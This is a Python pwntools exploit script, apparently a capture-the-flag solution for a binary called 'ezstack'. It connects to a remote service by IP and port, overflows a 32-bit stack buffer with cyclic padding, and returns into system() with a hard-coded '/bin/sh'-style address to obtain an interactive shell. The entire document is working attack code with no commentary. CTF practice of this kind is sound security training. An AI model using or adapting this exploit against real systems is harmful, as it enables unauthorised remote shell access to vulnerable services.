from pwn import *
context(log_level='debug',os='linux',arch='x86',terminal=['tmux','splitw','-h'])

io=remote("1.14.71.254",28178)
# io=process("./ezstack")
elf=ELF("./ezstack")
sys_addr=elf.sym[b"system"]
bin_addr=0x804A024
# gdb.attach(io)
# pause()
payload=cyclic(0x48+0x4)+p32(sys_addr)+p32(0)+p32(bin_addr)
# io.recvuntil(b'CTF\n')
io.sendline(payload)
io.interactive()